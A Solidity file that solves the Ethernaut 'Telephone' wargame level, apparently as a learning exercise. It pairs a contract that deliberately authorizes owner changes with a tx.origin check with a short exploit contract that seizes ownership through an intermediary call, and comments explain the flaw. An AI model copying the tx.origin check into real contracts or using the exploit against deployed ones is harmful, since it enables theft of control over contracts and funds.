// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautFourTelephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract EthernautFourTelephoneExploit {
    EthernautFourTelephone private ethernautFourTelephone;

    constructor(EthernautFourTelephone _address) {
        ethernautFourTelephone = EthernautFourTelephone(_address);
    }

    function exploit(address newOwner) external {
        ethernautFourTelephone.changeOwner(newOwner);
    }
}

// https://ethernaut.openzeppelin.com/level/0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe

// Solution
// The exploit lies in the fact that the contract allows anyone to change the owner
// as long as tx.origin != msg.sender
// If A calls contract B which calls contract C, tx.origin is A while msg.sender is B
// So if we deploy a contract which can call the ethernaut contact's changeOwner method,
// tx.origin and msg.sender will differ and we get to gain ownership.
